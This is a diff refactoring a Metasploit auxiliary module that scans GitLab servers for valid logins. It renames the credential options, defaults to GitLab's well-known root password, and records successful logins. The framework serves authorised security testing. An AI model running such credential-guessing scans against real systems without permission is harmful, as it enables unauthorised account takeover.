@@ -1,13 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'metasploit/framework/credential_collection'
 require 'metasploit/framework/login_scanner/gitlab'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -21,21 +20,21 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          ['URL', 'https://labs.mwrinfosecurity.com/blog/2015/03/20/gitlab-user-enumeration/']
+          ['URL', 'https://labs.f-secure.com/archive/gitlab-user-enumeration/']
         ]
     )
 
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('USERNAME', [ true, 'The username to test', 'root' ]),
-        OptString.new('PASSWORD', [ true, 'The password to test', '5iveL!fe' ]),
+        OptString.new('HttpUsername', [ true, 'The username to test', 'root' ]),
+        OptString.new('HttpPassword', [ true, 'The password to test', '5iveL!fe' ]),
         OptString.new('TARGETURI', [true, 'The path to GitLab', '/'])
-      ], self.class)
+      ])
+
+    deregister_options('PASSWORD_SPRAY')
 
     register_autofilter_ports([ 80, 443 ])
-
-    deregister_options('RHOST')
   end
 
   def run_host(ip)
@@ -55,14 +54,9 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    cred_collection = Metasploit::Framework::CredentialCollection.new(
-      blank_passwords: datastore['BLANK_PASSWORDS'],
-      pass_file: datastore['PASS_FILE'],
-      password: datastore['PASSWORD'],
-      user_file: datastore['USER_FILE'],
-      userpass_file: datastore['USERPASS_FILE'],
-      username: datastore['USERNAME'],
-      user_as_pass: datastore['USER_AS_PASS']
+    cred_collection = build_credential_collection(
+      username: datastore['HttpUsername'],
+      password: datastore['HttpPassword']
     )
 
     scanner = Metasploit::Framework::LoginScanner::GitLab.new(
@@ -86,7 +80,7 @@ class Metasploit3 < Msf::Auxiliary
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
 
-        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
+        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
       else
         invalidate_login(credential_data)
         vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
